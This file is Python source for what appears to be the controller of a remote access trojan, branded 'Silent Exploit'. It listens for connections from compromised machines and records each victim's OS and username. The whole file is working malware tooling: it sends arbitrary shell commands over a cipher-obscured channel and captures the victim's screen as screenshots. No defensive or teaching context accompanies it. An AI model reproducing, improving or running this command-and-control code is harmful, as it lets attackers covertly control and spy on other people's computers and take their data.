import socket
from base64 import b64decode
import threading
from random import randint
from ipaddress import ip_address
from colorama import Fore
from colorama import Style
from colorama import init
from os import name
from os import system
from os import getpid
from sys import argv
from time import strftime
from time import sleep

class Server():
	def __init__(self, ip, port):
		self.ip = ip
		self.port = port
		self.create_socket()
		self.ip_use = blue + self.ip + white
		self.port_use = blue + str(self.port) + white
		print(f"{self.time_now()} {succ} {left_sq_blue} Exploit Initialized {right_sq_blue}\n{self.time_now()} {inf} {left_sq_blue} IP: {self.ip_use} | Port: {self.port_use} {right_sq_blue}")
		self.wait_connection()

	def create_socket(self):
		try:
			self.sock = socket.socket(
				socket.AF_INET,
				socket.SOCK_STREAM,
				socket.IPPROTO_TCP
				)
			self.sock.bind( (self.ip, self.port) )
			self.sock.listen(1)
		except Exception as error:
			self.sock.close()
			print(f"{self.time_now()} {err} Error: {error}")
			exit()

	def wait_connection(self):
		try:
			self.key = 19731
			self.load = True
			self.check_path = True
			self.thread1 = threading.Thread(target=self.loading)
			self.thread1.start()
			self.thread2 = threading.Thread(target=self.accept_conn)
			self.thread2.start()
			self.ctrl_c()
			self.client_info = self.decrypt(data=self.conn.recv(1024).decode("utf-8")).split()
			self.systemname = red + self.client_info[0] + " " + self.client_info[1] + white
			self.username = red + self.client_info[2] + white
			self.conn_ip = red + self.addr[0] + white
			self.conn_port = red + str(self.addr[1]) + white
			print(f"{self.time_now()} {inf} {left_sq_blue} Connection from: IP: {self.conn_ip} | Port: {self.conn_port} | OS: {self.systemname} | Username: {self.username} {right_sq_blue}")
			self.recv_path = True
			self.send_command()
		except KeyboardInterrupt:
			self.conn.close()
			self.sock.close()
			print(f"{self.time_now()} {inf} {left_sq_blue} Exitting {right_sq_blue}")
			exit()
		except Exception as error:
			self.sock.close()
			print(f"{self.time_now()} {err} Error: {error}")
			exit()

	def send_command(self):
		while True:
			try:
				if self.check_path == True:
					if self.recv_path == True:
						self.path = self.decrypt(data=self.conn.recv(1024).decode("utf-8"))
						if "path:" in self.path:
							self.path = self.path.split("path:")[1]
				self.comm = str(input(f"{Style.BRIGHT + self.time_now() + blue} {left_sq_blue + red + self.path + right_sq_blue + input_style} "))
				if self.comm.lower() == "clear":
					self.check_path = False
					self.clear_term()
					sleep(0.05)
				elif self.comm.lower() == "users":
					self.check_path = False
					self.check_users()
					sleep(0.05)
				elif self.comm.lower() == "help":
					self.check_path = False
					self.help()
					sleep(0.05)
				elif self.comm.lower() == "address":
					self.check_path = False
					print(f"{self.time_now()} {inf} {left_sq_blue} IP: {self.ip_use} | Port: {self.port_use} {right_sq_blue}")
					sleep(0.05)
				elif "screenshot" in self.comm.lower().split():
					self.check_path = False
					self.recv_screen()
					sleep(0.05)
				elif "setcfg" in self.comm.lower().split():
					self.check_path = False
					self.setconfig()
					sleep(0.05)
				else:
					self.check_path = True
					if self.comm == "":
						self.comm = "null"
					self.key_new = randint(1, 1000000)
					self.conn.sendall(self.encrypt(data=self.comm+f"\nkey:{self.key_new}").encode("utf-8"))
					self.key = self.key_new
					self.resp = self.decrypt(data=self.conn.recv(1024).decode("utf-8"))
					if self.resp == "null command":
						print(f"{self.time_now()} {warn} Null command!")
						sleep(0.05)
					elif self.resp == "fail":
						self.out = self.decrypt(data=self.conn.recv(1024).decode("utf-8"))
						print(f"{self.time_now()} {err} Command failed!\n{self.out}")
						sleep(0.05)
					elif self.resp == "ok":
						self.out_full = ""
						while True:
							self.out = self.conn.recv(1024)
							self.out_full += self.decrypt(self.out.decode("utf-8"))
							if self.out_full == "done":
								break
							elif len(self.out) < 1024:
								break
						if self.out_full == "done":
							print(f"{self.time_now()} {succ} Done!")
							sleep(0.05)
						else:
							if "path:" in self.out_full:
								self.path = self.out_full.split("path:")[1]
								self.out_full = self.out_full.split("path:")[0]
								self.recv_path = False
							elif not "path:" in self.out_full:
								self.recv_path = True
							print(f"{self.time_now()} {inf} Response: \n{self.out_full[:-1]}")
							sleep(0.05)
					else:
						print(f"{self.time_now()} {warn} Unknown response!")
			except KeyboardInterrupt:
				self.conn.close()
				self.sock.close()
				print(f"\n{self.time_now()} {inf} {left_sq_blue} Exitting {right_sq_blue}")
				exit()
			except ConnectionResetError:
				print(f"{self.time_now()} {warn} {left_sq_red} Client has disconnected {right_sq_red}")
				self.wait_connection()
			except ConnectionAbortedError:
				print(f"{self.time_now()} {warn} {left_sq_red} Client has aborted the connection {right_sq_red}")
				self.wait_connection()
			except Exception as error:
				self.sock.close()
				print(f"{self.time_now()} {err} Error: {error}")
				exit()

	def encrypt(self, data):
		try:
			self.data = data
			self.data_encrypted = ""
			for symb in self.data:
				self.data_encrypted += chr(ord(symb) + self.key)
			return self.data_encrypted
		except Exception as error:
			self.sock.close()
			print(f"{self.time_now()} {err} Error: {error}")
			exit()

	def decrypt(self, data):
		try:
			self.data = data
			self.data_decrypted = ""
			for symb in self.data:
				self.data_decrypted += chr(ord(symb) - self.key)
			return self.data_decrypted
		except Exception as error:
			self.sock.close()
			print(f"{self.time_now()} {err} Error: {error}")
			exit()

	def loading(self):
		while self.load:
			if self.load == True:
				print(f"{self.time_now()} {inf} {left_sq_blue} Waitting for connection      {right_sq_blue}", end="\r")
				sleep(0.25)
			if self.load == True:
				print(f"{self.time_now()} {inf} {left_sq_blue} Waitting for connection »    {right_sq_blue}", end="\r")
				sleep(0.25)
			if self.load == True:
				print(f"{self.time_now()} {inf} {left_sq_blue} Waitting for connection «»   {right_sq_blue}", end="\r")
				sleep(0.25)
			if self.load == True:
				print(f"{self.time_now()} {inf} {left_sq_blue} Waitting for connection  «»  {right_sq_blue}", end="\r")
				sleep(0.25)
			if self.load == True:
				print(f"{self.time_now()} {inf} {left_sq_blue} Waitting for connection   «» {right_sq_blue}", end="\r")
				sleep(0.25)
			if self.load == True:
				print(f"{self.time_now()} {inf} {left_sq_blue} Waitting for connection    « {right_sq_blue}", end="\r")
				sleep(0.25)

	def accept_conn(self):
		try:
			self.conn, self.addr = self.sock.accept()
			self.load = False
		except Exception as error:
			self.sock.close()
			print(f"{self.time_now()} {err} Error: {error}")
			exit()

	def ctrl_c(self):
		self.i = 0
		while self.load:
			try:
				self.i += 1
				sleep(0.01)
				self.i -= 1
			except KeyboardInterrupt:
				print(f"\n{self.time_now()} {inf} {left_sq_blue} Exitting {right_sq_blue}")
				self.load = False
				system(f"TASKKILL /F /PID {str(getpid())}" if name == "nt" else f"kill -9 {str(getpid())}")

	def setconfig(self):
		if "ip" in self.comm.lower().split():
			try:
				ip_address(self.comm.lower().split()[2])
				self.ip = self.comm.lower().split()[2]
				self.ip_use = blue + self.ip + white
				print(f"{self.time_now()} {succ} IP has set to: {self.comm.lower().split()[2]}")
			except ValueError:
				print(f"{self.time_now()} {err} IP incorrect!")
			except:
				print(f"{self.time_now()} {err} No ip argument has set!")
		elif "port" in self.comm.lower().split():
			try:
				self.check_port = int(self.comm.lower().split()[2])
				if self.check_port < 1024 or self.check_port > 65535:
					print(f"{self.time_now()} {err} Port incorrect(must be more that 1024 & less that 65535)!")
				else:
					self.port = self.check_port
					self.port_use = blue + str(self.port) + white
					print(f"{self.time_now()} {succ} Port has set to: {self.comm.lower().split()[2]}")
			except:
				print(f"{self.time_now()} {err} No port argument has set!")
		elif "apply" in self.comm.lower().split():
			try:
				self.conn.close()
				self.sock.close()
				self.create_socket()
				print(f"{self.time_now()} {succ} Config has applied!")
				self.wait_connection()
			except Exception as error:
				print(f"{self.time_now()} {err} Error: {error}")
		else:
			print(f"{self.time_now()} {err} No arguments have set!")

	def recv_screen(self):
		try:
			self.imagename = self.comm.lower().split()[1]
			self.key_new = randint(1, 1000000)
			self.conn.sendall(self.encrypt(data=f"screenshot\nkey:{self.key_new}").encode("utf-8"))
			self.key = self.key_new
			self.resp = self.decrypt(data=self.conn.recv(1024).decode("utf-8"))
			if self.resp == "ok":
				self.imagedata = b''
				while True:
					self.imagepart = self.conn.recv(1024)
					self.imagedata += self.imagepart
					if len(self.imagepart) < 1024:
						break
				self.imagedecode = b64decode(self.imagedata)
				self.save_screen()
			elif self.resp == "fail":
				print(f"{self.time_now()} {err} Command failed!\n{self.out}")
		except:
			print(f"{self.time_now()} {err} No image name argument has set(screenshot imagename.png)!")

	def save_screen(self):
		if "Windows" in self.client_info[0]:
			try:
				with open(f"screenshots\{self.imagename}.png", "wb") as self.file:
					self.file.write(self.imagedecode)
				self.file.close()
				print(f"{self.time_now()} {succ} Screenshot saved 'sreenshots\{self.imagename}.png'")
			except:
				system("mkdir screenshots")
				self.save_screen()
		else:
			try:
				with open(f"screenshots/{self.imagename}.png", "wb") as self.file:
					self.file.write(self.imagedecode)
				self.file.close()
				print(f"{self.time_now()} {succ} Screenshot saved 'sreenshots/{self.imagename}.png'")
			except:
				system("mkdir screenshots")
				self.save_screen()

	def clear_term(self):
		system("cls" if name == "nt" else "clear")
		print(purple + welcome + white)

	def check_users(self):
		print(f"{self.time_now()} {inf} {left_sq_blue} IP: {self.conn_ip} | Port: {self.conn_port} | OS: {self.systemname} | Username: {self.username} {right_sq_blue}")

	def help(self):
		print(f"{self.time_now()} {inf} {left_sq_blue} Command list {right_sq_blue}\nClear - clear the terminal\nUsers - check the connected users\nAddress - check the server address\nSetcfg - change the server configuration:\nIp - set server ip address\nPort - set server port\nApply - apply the configurations\nScreenshot - make screenshot\nHelp - show aviable commands")

	def time_now(self):
		time_now = blue + strftime("[%m-%d-%Y | %H-%M-%S]") + white
		return time_now

try:
	system("cls" if name == "nt" else "clear")
	init()
	Style.BRIGHT
	red = Fore.RED
	blue = Fore.BLUE
	cyan = Fore.CYAN
	green = Fore.GREEN
	white = Fore.WHITE
	yellow = Fore.YELLOW
	purple = Fore.MAGENTA
	input_style = red + "~$" + white
	left_sq_red = red + "[" + white
	right_sq_red = red + "]" + white
	left_sq_blue = blue + "[" + white
	right_sq_blue = blue + "]" + white
	succ = f"{green}[+]{white}"
	err = f"{red}[X]{white}"
	inf = f"{cyan}[i]{white}"
	warn = f"{yellow}[!]{white}"
	ask = f"{purple}[?]{white}"
	welcome = """   ____ _  __           __    ____             __       _  __
  / __/(_)/ /___  ___  / /_  / __/__ __ ___   / /___   (_)/ /_
 _\ \ / // // -_)/ _ \/ __/ / _/  \ \ // _ \ / // _ \ / // __/
/___//_//_/ \__//_//_/\__/ /___/ /_\_\/ .__//_/ \___//_/ \__/
Type 'help' command to show aviable  /_/ commands        (v0.1)"""
	print(purple + welcome + white)
	time_now = blue + strftime("[%m-%d-%Y | %H-%M-%S]") + white
	print(f"{time_now} {inf} {left_sq_blue} Initializing Exploit {right_sq_blue}")
	try:
		ip = str(argv[1])
		ip_address(ip)
	except ValueError:
		print(f"{time_now} {err} IP incorrect!")
		exit()
	port = int(argv[2])
	if port < 1024 or port > 65535:
		print(f"{time_now} {err} Port incorrect(must be more that 1024 & less that 65535)!")
		exit()
	Server(ip=ip, port=port)
except Exception as error:
	time_now = blue + strftime("[%m-%d-%Y | %H-%M-%S]") + white
	print(f"{time_now} {err} Error: {error}")
	print(f"""{purple}
+――――――――――――――――――――――――――――――――――――――――――――――――――+
|Usage: python3 server.py (server ip) (server port)|
+――――――――――――――――――――――――――――――――――――――――――――――――――+{white}""")
	exit()
